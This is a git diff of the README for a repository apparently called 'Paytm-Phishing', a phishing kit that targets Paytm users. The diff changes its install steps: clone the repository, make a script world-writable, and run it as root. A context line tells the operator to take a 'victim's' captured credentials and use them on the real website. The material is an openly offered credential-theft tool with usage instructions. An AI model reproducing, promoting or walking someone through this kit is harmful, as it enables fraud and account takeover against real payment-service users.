@@ -20,8 +20,8 @@ When victim enter his credentials, you need to go to original website and use th
 # How to Intsall & Use
 root ---must !
 1. git clone https://github.com/Ignitetch/Paytm-Phishing.git
-2. cd Paytm-phishing
-3. chmod 777 Paytm.sh
+2. cd Paytm-Phishing
+3. chmod 777 setup.sh
 4. ./Paytm.sh
 
 # Contact For Contribute
